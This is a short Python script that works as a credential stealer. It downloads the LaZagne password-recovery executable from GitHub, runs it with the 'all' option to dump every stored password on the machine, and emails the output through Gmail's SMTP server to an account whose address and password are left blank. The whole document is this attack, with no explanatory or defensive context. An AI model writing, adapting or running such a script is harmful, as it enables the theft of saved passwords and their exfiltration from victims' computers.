import requests, smtplib, subprocess


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

download("https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe")
result = subprocess.check_output("LaZagne.exe all", shell=True)

send_mail("", "", result)